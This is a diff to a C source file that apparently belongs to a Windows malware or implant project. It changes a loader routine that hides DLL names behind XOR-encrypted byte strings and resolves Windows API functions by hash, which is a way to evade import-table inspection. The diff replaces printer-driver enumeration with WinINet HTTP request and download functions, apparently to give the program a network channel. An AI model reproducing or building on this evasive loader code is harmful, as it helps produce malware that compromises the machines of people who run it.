@@ -11,12 +11,12 @@ BOOL loadApi(API_Call *APICall) {
 	Advapi32_API* Advapi32Api = &(APICall->Advapi32Api);
 	Shell32_API* Shell32Api = &(APICall->Shell32Api);
 	Ws2_32_API* Ws2_32Api = &(APICall->Ws2_32Api);
-	Winspool_API* WinspoolApi = &(APICall->WinspoolApi);
+	Wininet_API* WininetApi = &(APICall->WininetApi);
 
-	char Advapi32DllStr[] = "\x28\x26\x1E\x2F\x3F\x1D\x7B\x5C\x7A\x23\x03\x22\x64";
-	char Shell32DllStr[] = "\x21\x26\x11\x1E\x1A\x5C\x50\x62\x0B\x0F\x29\x55";
-	char Ws2_32DllStr[] = "\x36\x14\x63\x1B\x5B\x7C\x43\x30\x0D\x0B\x51";
-	char WinspoolDllStr[] = "\x3E\x0E\x0F\x1A\x17\x0E\x06\x0B\x4F\x0D\x15\x17\x69";
+	char Advapi32DllStr[] = "\x18\x2A\x23\x11\x26\x02\x64\x64\x7A\x35\x0E\x2F\x55";
+	char Shell32DllStr[] = "\x3F\x04\x09\x00\x00\x5F\x5E\x42\x08\x00\x00\x6C";
+	char Ws2_32DllStr[] = "\x3B\x35\x7C\x13\x6B\x74\x5D\x10\x34\x1B\x76";
+	char WininetDllStr[] = "\x12\x00\x03\x07\x0B\x20\x1D\x43\x0A\x09\x29\x69";
 
 
 	const DWORD hash_kernel32_dll = 0x29cdd463;
@@ -32,10 +32,10 @@ BOOL loadApi(API_Call *APICall) {
 	if(pLoadLibraryA == NULL)
 		return FALSE;
 
-	decryptionRoutine(Advapi32DllStr,13,"\x69\x42\x68\x4E\x4F\x74\x48\x6E\x54\x47\x6F\x4E\x64");
-	decryptionRoutine(Shell32DllStr,12,"\x72\x4E\x74\x72\x76\x6F\x62\x4C\x6F\x63\x45\x55");
-	decryptionRoutine(Ws2_32DllStr,11,"\x61\x67\x51\x44\x68\x4E\x6D\x54\x00\x00\x6B");
-	decryptionRoutine(WinspoolDllStr,13,"\x69\x67\x61\x00\x52\x51\x58\x72\x6A\x43\x49\x4C\x6D");
+	decryptionRoutine(Advapi32DllStr,13,"\x59\x4E\x55\x70\x56\x6B\x57\x56\x54\x51\x62\x43\x55");
+	decryptionRoutine(Shell32DllStr,12,"\x6C\x00\x57\x5A\x49\x62\x65\x54\x4C\x62\x62\x6D");
+	decryptionRoutine(Ws2_32DllStr,11,"\x6C\x46\x4E\x4C\x58\x46\x73\x74\x58\x77\x76");
+	decryptionRoutine(WininetDllStr,12,"\x45\x69\x6D\x6E\x65\x00\x53\x00\x6E\x4A\x49\x75");
 
 
 	Kernel32Api->CreateToolhelp32SnapshotF = (CreateToolhelp32Snapshot_F)find_api(pPeb,hash_kernel32_dll, 0x9eb60b55);
@@ -130,11 +130,17 @@ BOOL loadApi(API_Call *APICall) {
 	}else
 		return FALSE;
 
-	if(pLoadLibraryA(WinspoolDllStr) != NULL) {
-		const DWORD WinspoolHash = 0x36ea836;
-		memset(WinspoolDllStr,0x00,13);
-		WinspoolApi->EnumPrinterDriversF = (EnumPrinterDrivers_F)find_api(pPeb,WinspoolHash, 0x914eea03);
-		if(WinspoolApi->EnumPrinterDriversF == NULL)
+	if(pLoadLibraryA(WininetDllStr) != NULL) {
+		const DWORD WininetHash = 0x6f4f2831;
+		memset(WininetDllStr,0x00,12);
+		WininetApi->HttpOpenRequestAF = (HttpOpenRequestA_F)find_api(pPeb,WininetHash, 0x778a36fd);
+		WininetApi->InternetSetOptionAF = (InternetSetOptionA_F)find_api(pPeb,WininetHash, 0xf0cfdd14);
+		WininetApi->InternetReadFileF = (InternetReadFile_F)find_api(pPeb,WininetHash, 0x2f761326);
+		WininetApi->InternetOpenAF = (InternetOpenA_F)find_api(pPeb,WininetHash, 0x78da62e7);
+		WininetApi->InternetCloseHandleF = (InternetCloseHandle_F)find_api(pPeb,WininetHash, 0xd1490f26);
+		WininetApi->InternetConnectWF = (InternetConnectW_F)find_api(pPeb,WininetHash, 0x27404e3f);
+		WininetApi->HttpSendRequestAF = (HttpSendRequestA_F)find_api(pPeb,WininetHash, 0xc2d42b63);
+		if(WininetApi->HttpOpenRequestAF == NULL ||WininetApi->InternetSetOptionAF == NULL ||WininetApi->InternetReadFileF == NULL ||WininetApi->InternetOpenAF == NULL ||WininetApi->InternetCloseHandleF == NULL ||WininetApi->InternetConnectWF == NULL ||WininetApi->HttpSendRequestAF == NULL)
 			return FALSE;
 	}else
 		return FALSE;
